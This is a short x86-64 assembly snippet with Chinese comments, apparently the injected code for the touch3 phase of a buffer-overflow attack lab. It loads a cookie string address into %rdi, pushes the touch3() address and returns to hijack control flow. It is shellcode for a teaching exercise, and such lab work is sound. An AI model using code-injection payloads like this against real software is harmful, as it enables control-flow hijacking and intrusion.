	movq $0x5561dca8,%rdi	#cookie字符串所在的首地址
	pushq $0x4018fa			#touch3()地址入栈
	ret						#跳转至touch3()
